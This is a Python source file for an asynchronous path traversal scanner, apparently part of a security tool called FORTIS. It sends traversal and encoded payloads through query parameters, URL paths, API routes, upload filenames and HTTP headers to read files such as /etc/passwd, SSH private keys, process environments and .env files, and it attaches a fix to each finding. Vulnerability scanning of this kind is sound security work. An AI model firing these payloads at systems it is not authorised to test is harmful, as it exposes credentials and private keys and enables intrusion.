
import asyncio
import aiohttp
import sys
import re
import time
import argparse
from urllib.parse import urlparse, urljoin, quote, urlencode, parse_qs, urlunparse
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set

try:
    from bs4 import BeautifulSoup
    _BS4 = True
except ImportError:
    _BS4 = False

# ── Terminal colours ──────────────────────────────────────
BOLD  = "\033[1m"; RESET = "\033[0m"
GREEN = "\033[92m"; DIM   = "\033[2m"
SEV_COLOR = {
    "CRITICAL": "\033[91m", "HIGH": "\033[31m",
    "MEDIUM":   "\033[33m", "LOW":  "\033[34m", "INFO": "\033[37m",
}
SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

# ── Concurrency ───────────────────────────────────────────
_SEM_LIMIT       = 6   # max parallel requests
_REQUEST_TIMEOUT = 7   # seconds

# ── Data models ───────────────────────────────────────────
@dataclass
class Finding:
    name:           str
    severity:       str
    description:    str
    endpoint:       str
    method:         str = "GET"
    evidence:       str = ""
    param:          str = ""
    recommendation: str = ""

@dataclass
class ScanResult:
    target:   str
    duration: float = 0.0
    findings: List[Finding] = field(default_factory=list)
    errors:   List[str]     = field(default_factory=list)

# ── Target files ──────────────────────────────────────────
LINUX_FILES = [
    ("/etc/passwd",               "passwd_sig",   "Linux user accounts"),
    ("/etc/hosts",                "hosts_sig",    "Hosts file"),
    ("/proc/self/environ",        "environ_sig",  "Process environment"),
    ("/etc/nginx/nginx.conf",     "nginx_sig",    "Nginx config"),
    ("/root/.ssh/id_rsa",         "rsa_sig",      "SSH private key"),
    ("/var/log/nginx/access.log", "log_sig",      "Nginx access log"),
]

WINDOWS_FILES = [
    ("C:/Windows/win.ini",        "winini_sig",   "Windows ini"),
    ("C:/inetpub/wwwroot/web.config", "webconfig_sig", "IIS web config"),
]

# ── Strong confirmation signatures ───────────────────────
# key → list of regex patterns; ANY one must match in the response body.
_SIGNATURES: Dict[str, List[str]] = {
    "passwd_sig":    [r"root:x:0:0", r"root:[x!*]:0:0", r"/bin/bash", r"/usr/sbin/nologin"],
    "hosts_sig":     [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost"],
    "environ_sig":   [r"PATH=(?:/[^:]+:)+/[^:\s]+", r"HOME=/\w"],
    "nginx_sig":     [r"worker_processes\s+\d", r"http\s*\{", r"server\s*\{"],
    "rsa_sig":       [r"-----BEGIN (?:RSA )?PRIVATE KEY-----"],
    "log_sig":       [r'"GET /', r'"POST /', r'HTTP/1\.[01]" \d{3}'],
    "winini_sig":    [r"\[fonts\]", r"\[extensions\]"],
    "webconfig_sig": [r"<connectionStrings>", r"connectionString\s*="],
    "env_file_sig":  [r"[A-Z_]{3,}=.{2,}", r"DB_|API_|SECRET_|PASSWORD"],
    "php_sig":       [r"<\?php\s", r"\$_SERVER", r"\$_GET"],
    "xml_sig":       [r"<\?xml\s+version=", r"<configuration>"],
}

def _confirmed(body: str, sig_key: str) -> bool:
    """Return True only if at least one strong regex matches — not just substring."""
    patterns = _SIGNATURES.get(sig_key, [])
    if not patterns:
        return False
    return any(re.search(p, body, re.MULTILINE | re.IGNORECASE) for p in patterns)

# ── Traversal payload builder ─────────────────────────────
def _make_payloads(target_file: str, max_depth: int = 6) -> List[tuple]:
    """
    Return a deduplicated list of (payload_string, sig_key) tuples.
    Kept intentionally small — enough to confirm vulnerability, not flood the server.
    """
    sig_key = next(
        (k for k, _ in _SIGNATURES.items()
         if any(re.search(p, target_file, re.I) for p in [k.replace("_sig","")])),
        None
    )
    # Map file path → sig key
    _file_sig_map = {
        "/etc/passwd":          "passwd_sig",
        "/etc/hosts":           "hosts_sig",
        "/proc/self/environ":   "environ_sig",
        "/etc/nginx/nginx.conf":"nginx_sig",
        "/root/.ssh/id_rsa":    "rsa_sig",
        "win.ini":              "winini_sig",
        "web.config":           "webconfig_sig",
        "nginx/access.log":     "log_sig",
    }
    sig_key = next((v for k, v in _file_sig_map.items() if k in target_file), "passwd_sig")

    payloads: List[tuple] = []
    bare = target_file.lstrip("/")
    win_bare = bare.replace("/", "\\")

    for d in range(2, max_depth + 1):
        prefix_unix = "../" * d
        prefix_win  = "..\\" * d
        enc_prefix  = "%2e%2e%2f" * d
        dbl_prefix  = "%252e%252e%252f" * d

        payloads.append((f"{prefix_unix}{bare}",          sig_key))
        payloads.append((f"{prefix_win}{win_bare}",       sig_key))
        payloads.append((f"{enc_prefix}{bare}",           sig_key))
        payloads.append((f"{dbl_prefix}{bare}",           sig_key))
        payloads.append((f"{'..%2f' * d}{bare}",          sig_key))
        payloads.append((target_file,                     sig_key))  # absolute

    # Deduplicate preserving order
    seen: Set[str] = set()
    unique = []
    for p, s in payloads:
        if p not in seen:
            seen.add(p)
            unique.append((p, s))
    return unique

# ── URL parameters prone to traversal ────────────────────
TRAVERSAL_PARAMS = [
    "file", "path", "page", "name", "filename", "filepath", "dir", "folder",
    "include", "load", "read", "view", "document", "template", "src", "source",
    "resource", "data", "content", "fetch", "download", "export", "lang",
]

# ── Shared HTTP fetch ─────────────────────────────────────
async def _fetch(session: aiohttp.ClientSession,
                 sem: asyncio.Semaphore,
                 url: str,
                 method: str = "GET",
                 headers: Optional[Dict] = None,
                 data=None,
                 token: Optional[str] = None) -> tuple:
    """Return (status, body, response_headers). Never raises."""
    h = {"User-Agent": "Mozilla/5.0 (FORTIS-Scanner/2.0)", "Accept": "*/*"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if headers:
        h.update(headers)
    try:
        async with sem:
            kw: Dict = dict(
                headers=h,
                ssl=False,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=_REQUEST_TIMEOUT),
            )
            if method == "POST" and data is not None:
                kw["data"] = data
            async with session.request(method, url, **kw) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
    except asyncio.TimeoutError:
        return 0, "", {"_error": "timeout"}
    except aiohttp.ClientError as exc:
        return 0, "", {"_error": str(exc)}
    except Exception as exc:
        return 0, "", {"_error": str(exc)}


# ══════════════════════════════════════════════════════════
#  CHECK 1 — URL Query Parameter Traversal
# ══════════════════════════════════════════════════════════
async def check_param_traversal(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    target_files = LINUX_FILES[:4] + WINDOWS_FILES[:2]

    async def probe(param, file_path, sig_key, label, payload):
        test_url = f"{base}?{param}={quote(payload, safe='./\\%')}"
        s, body, _ = await _fetch(session, sem, test_url, token=token)
        if s == 200 and _confirmed(body, sig_key):
            findings.append(Finding(
                name=f"Path Traversal via param '{param}' — {label}",
                severity="CRITICAL",
                description=(
                    f"Parameter '{param}' accepts path traversal. "
                    f"Payload '{payload[:50]}' read '{file_path}'."
                ),
                endpoint=test_url,
                method="GET",
                param=param,
                evidence=f"HTTP {s} | Signature '{sig_key}' confirmed | Payload: {payload[:60]}",
                recommendation=(
                    "Never pass filesystem paths from user input. "
                    "Use an allowlist of file keys. Jail the file root with os.path.realpath()."
                ),
            ))

    tasks = [
        probe(param, fp, sig, label, payload)
        for param in TRAVERSAL_PARAMS[:8]
        for fp, sig, label in target_files
        for payload, psig in _make_payloads(fp, max_depth=5)[:8]
        if psig == sig
    ]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_param_traversal: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 2 — URL Path Segment Traversal
# ══════════════════════════════════════════════════════════
async def check_path_segment_traversal(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    # Common path patterns where the last segment might be a file name
    path_patterns = ["/files/", "/download/", "/static/", "/assets/",
                     "/uploads/", "/media/", "/documents/", "/img/"]
    target_files = [LINUX_FILES[0], LINUX_FILES[1], WINDOWS_FILES[0]]

    async def probe(base_path, fp, sig, label, payload):
        test_url = origin + base_path + quote(payload, safe="./\\%")
        s, body, _ = await _fetch(session, sem, test_url, token=token)
        if s == 200 and _confirmed(body, sig):
            findings.append(Finding(
                name=f"Path Traversal in URL Segment — {label}",
                severity="CRITICAL",
                description=f"URL path '{base_path}' is vulnerable to traversal. Read '{fp}'.",
                endpoint=test_url,
                method="GET",
                evidence=f"HTTP {s} | Signature '{sig}' confirmed",
                recommendation="Use os.path.basename() and os.path.realpath() to jail file access.",
            ))

    tasks = [
        probe(bp, fp, sig, label, payload)
        for bp in path_patterns
        for fp, sig, label in target_files
        for payload, _ in _make_payloads(fp, max_depth=5)[:6]
    ]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_path_segment_traversal: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 3 — Encoded Traversal
# ══════════════════════════════════════════════════════════
async def check_encoded_traversal(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # Extra encodings not in the main payload generator
    extra_variants = [
        ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "passwd_sig"),
        ("..%252f..%252f..%252fetc/passwd",                    "passwd_sig"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd",                 "passwd_sig"),
        ("....//....//....//etc/passwd",                       "passwd_sig"),
        ("..%5c..%5c..%5cwindows%5cwin.ini",                   "winini_sig"),
    ]

    async def probe(param, payload, sig):
        test_url = f"{base}?{param}={payload}"
        s, body, _ = await _fetch(session, sem, test_url, token=token)
        if s == 200 and _confirmed(body, sig):
            findings.append(Finding(
                name=f"Encoded Path Traversal via '{param}'",
                severity="CRITICAL",
                description=f"Encoded traversal payload read a sensitive file via param '{param}'.",
                endpoint=test_url,
                method="GET",
                param=param,
                evidence=f"HTTP {s} | Sig '{sig}' confirmed | Payload: {payload[:60]}",
                recommendation="Decode URLs fully before path validation. Reject any resolved path outside the allowed root.",
            ))

    tasks = [
        probe(param, payload, sig)
        for param in TRAVERSAL_PARAMS[:6]
        for payload, sig in extra_variants
    ]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_encoded_traversal: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 4 — API Endpoint Path Parameter Traversal
# ══════════════════════════════════════════════════════════
async def check_api_traversal(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    api_bases = [
        "/api/v1/files/", "/api/files/", "/api/v1/documents/",
        "/api/documents/", "/api/v1/media/", "/api/media/",
    ]
    target_file = "/etc/passwd"
    payloads = [p for p, _ in _make_payloads(target_file, max_depth=5)[:6]]

    async def probe(api_base, payload):
        test_url = origin + api_base + quote(payload, safe="./\\%")
        s, body, _ = await _fetch(session, sem, test_url, token=token)
        if s == 200 and _confirmed(body, "passwd_sig"):
            findings.append(Finding(
                name=f"Path Traversal in API Path Parameter",
                severity="CRITICAL",
                description=f"API endpoint '{api_base}' accepts traversal in path. Read /etc/passwd.",
                endpoint=test_url,
                method="GET",
                evidence=f"HTTP {s} | passwd_sig confirmed | Payload: {payload[:60]}",
                recommendation="Sanitize path parameters. Validate against an allowlist of resource IDs.",
            ))

    tasks = [probe(b, p) for b in api_bases for p in payloads]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_api_traversal: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 5 — Upload / Zip Slip
# ══════════════════════════════════════════════════════════
async def check_upload_traversal(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    upload_paths = ["/upload", "/api/upload", "/api/v1/upload",
                    "/files/upload", "/media/upload"]
    evil_filenames = [
        "../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "%2e%2e%2fetc%2fpasswd",
    ]

    async def probe(path, evil_name):
        ep = origin + path
        data = aiohttp.FormData()
        data.add_field("file", b"fortis_test",
                       filename=evil_name, content_type="text/plain")
        h = {"User-Agent": "Mozilla/5.0 (FORTIS-Scanner/2.0)"}
        if token:
            h["Authorization"] = f"Bearer {token}"
        try:
            async with sem:
                async with session.post(
                    ep, data=data, headers=h, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=_REQUEST_TIMEOUT),
                    allow_redirects=False
                ) as r:
                    body = await r.text(errors="ignore")
                    if r.status in (200, 201) and evil_name[:4] in body or "saved" in body.lower():
                        findings.append(Finding(
                            name="Zip Slip / Upload Path Traversal",
                            severity="CRITICAL",
                            description=(
                                f"Upload endpoint '{path}' accepted traversal filename '{evil_name}'. "
                                "Attacker may write files outside the upload directory."
                            ),
                            endpoint=ep,
                            method="POST",
                            evidence=f"Filename: {evil_name} | HTTP {r.status} | Response: {body[:80]}",
                            recommendation=(
                                "Strip all path components with os.path.basename(). "
                                "Randomize filenames server-side. Never use client-supplied filenames."
                            ),
                        ))
        except asyncio.TimeoutError:
            errors.append(f"check_upload_traversal: timeout on {ep}")
        except Exception as exc:
            errors.append(f"check_upload_traversal: {exc}")

    tasks = [probe(path, fname) for path in upload_paths for fname in evil_filenames[:2]]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_upload_traversal outer: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 6 — HTTP Header Traversal
# ══════════════════════════════════════════════════════════
async def check_header_traversal(session, sem, url, findings, errors, token):
    traversal_headers = {
        "X-File-Name":           "../../etc/passwd",
        "X-Filename":            "../../etc/passwd",
        "X-Original-URL":        "/../../../etc/passwd",
        "X-Rewrite-URL":         "/../../../etc/passwd",
        "Content-Disposition":   'attachment; filename="../../etc/passwd"',
    }

    async def probe(hdr, payload):
        s, body, _ = await _fetch(session, sem, url,
                                   headers={hdr: payload}, token=token)
        if s == 200 and _confirmed(body, "passwd_sig"):
            findings.append(Finding(
                name=f"Path Traversal via HTTP Header '{hdr}'",
                severity="HIGH",
                description=f"Header '{hdr}' with traversal payload caused server to read /etc/passwd.",
                endpoint=url,
                method="GET",
                param=hdr,
                evidence=f"Header: {hdr}: {payload} | passwd_sig confirmed",
                recommendation=f"Never resolve file paths from HTTP headers. Ignore '{hdr}' entirely.",
            ))

    tasks = [probe(h, p) for h, p in traversal_headers.items()]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_header_traversal: {exc}")


# ══════════════════════════════════════════════════════════
#  CHECK 7 — Direct Sensitive File Access
# ══════════════════════════════════════════════════════════
async def check_direct_file_access(session, sem, url, findings, errors, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    direct_paths = [
        ("/etc/passwd",    "passwd_sig",    "Linux passwd"),
        ("/etc/hosts",     "hosts_sig",     "Hosts file"),
        ("/.env",          "env_file_sig",  "Env file"),
        ("/config.php",    "php_sig",       "PHP config"),
        ("/web.config",    "xml_sig",       "Web config"),
        ("/windows/win.ini","winini_sig",   "Windows ini"),
    ]

    async def probe(path, sig, label):
        test_url = origin + path
        s, body, _ = await _fetch(session, sem, test_url, token=token)
        if s == 200 and _confirmed(body, sig):
            findings.append(Finding(
                name=f"Direct Sensitive File Access: {label}",
                severity="CRITICAL",
                description=f"'{path}' is directly accessible without traversal — misconfigured web root.",
                endpoint=test_url,
                method="GET",
                evidence=f"HTTP {s} | Sig '{sig}' confirmed | Preview: {body[:80]}",
                recommendation=f"Block direct access to '{path}' via web server configuration.",
            ))

    tasks = [probe(p, s, l) for p, s, l in direct_paths]
    for coro in asyncio.as_completed(tasks):
        try:
            await coro
        except Exception as exc:
            errors.append(f"check_direct_file_access: {exc}")


# ══════════════════════════════════════════════════════════
#  ORCHESTRATOR
# ══════════════════════════════════════════════════════════
async def run_scanner(target_url: str,
                      token: Optional[str] = None) -> ScanResult:
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    result = ScanResult(target=target_url)
    sem = asyncio.Semaphore(_SEM_LIMIT)
    connector = aiohttp.TCPConnector(ssl=False, limit=_SEM_LIMIT)

    checks = [
        ("param_traversal",        check_param_traversal),
        ("path_segment_traversal", check_path_segment_traversal),
        ("encoded_traversal",      check_encoded_traversal),
        ("api_traversal",          check_api_traversal),
        ("upload_traversal",       check_upload_traversal),
        ("header_traversal",       check_header_traversal),
        ("direct_file_access",     check_direct_file_access),
    ]

    async with aiohttp.ClientSession(connector=connector) as session:
        start = time.perf_counter()
        findings: List[Finding] = []

        # Run checks in two batches to keep concurrency bounded
        BATCH = 3
        for i in range(0, len(checks), BATCH):
            batch = checks[i:i + BATCH]
            tasks = [
                fn(session, sem, target_url, findings, result.errors, token)
                for _, fn in batch
            ]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for (name, _), res in zip(batch, batch_results):
                if isinstance(res, Exception):
                    result.errors.append(f"{name}: {res}")

        result.duration = time.perf_counter() - start

        # Deduplicate
        seen: Set[tuple] = set()
        for f in findings:
            key = (f.endpoint[:80], f.param, f.name[:40])
            if key not in seen:
                seen.add(key)
                result.findings.append(f)

    result.findings.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 9))
    return result


# ══════════════════════════════════════════════════════════
#  REPORT (standalone use)
# ══════════════════════════════════════════════════════════
def print_report(result: ScanResult) -> None:
    line = "═" * 68
    print(f"\n{BOLD}{line}{RESET}")
    print(f"{BOLD}  PATH TRAVERSAL SCAN REPORT  —  FORTIS Edition{RESET}")
    print(f"{line}")
    print(f"  Target   : {result.target}")
    print(f"  Duration : {result.duration:.2f}s")
    print(f"  Findings : {len(result.findings)}")
    print(f"{line}\n")

    if not result.findings:
        print(f"  {GREEN}✅  No path traversal vulnerabilities detected.{RESET}\n")
    else:
        for i, f in enumerate(result.findings, 1):
            c = SEV_COLOR.get(f.severity, "")
            print(f"  {BOLD}[{i:02d}] {c}{f.severity}{RESET}{BOLD} — {f.name}{RESET}")
            print(f"       Endpoint : [{f.method}] {f.endpoint[:90]}")
            print(f"       Detail   : {f.description}")
            if f.evidence:       print(f"       Evidence : {f.evidence[:120]}")
            if f.recommendation: print(f"       Fix      : {f.recommendation}")
            print()

    if result.errors:
        print(f"  {BOLD}Scan errors ({len(result.errors)}):{RESET}")
        for e in result.errors[:10]:
            print(f"     • {e}")
    print(f"{line}\n")


# ══════════════════════════════════════════════════════════
#  STANDARD FORTIS scan() INTERFACE
# ══════════════════════════════════════════════════════════
async def scan(
    target: str,
    crawl_depth: int = 2,
    insecure: bool = False,
    pre_crawled: dict | None = None,
) -> dict:
    """
    Standard FORTIS interface — called by main.py.
    Returns a dict with keys: target, findings, errors.
    Each finding has: check, severity, description, source_url,
                      evidence, recommendation, category, method.
    """
    token: Optional[str] = None
    if isinstance(pre_crawled, dict):
        token = pre_crawled.get("token")

    try:
        result = await run_scanner(target, token=token)
        return {
            "target": result.target,
            "findings": [
                {
                    "check":          f.name,
                    "severity":       f.severity,
                    "description":    f.description,
                    "source_url":     f.endpoint,
                    "evidence":       f.evidence or f"param={f.param} method={f.method}",
                    "recommendation": f.recommendation,
                    "category":       "path_traversal",
                    "method":         f.method,
                }
                for f in result.findings
            ],
            "errors": result.errors,
            "meta": {
                "duration": round(result.duration, 2),
            },
        }
    except Exception as exc:
        return {"target": target, "findings": [], "errors": [str(exc)]}


# ══════════════════════════════════════════════════════════
#  STANDALONE ENTRY POINT  (must be last)
# ══════════════════════════════════════════════════════════
async def _main():
    parser = argparse.ArgumentParser(description="Path Traversal Scanner — FORTIS Edition")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--token", default=None, help="Bearer token")
    args = parser.parse_args()

    print(f"\n  {BOLD}Path Traversal Scanner  —  FORTIS Edition{RESET}")
    print(f"  Target: {args.url}\n")

    result = await run_scanner(args.url, args.token)
    print_report(result)


if __name__ == "__main__":
    asyncio.run(_main())
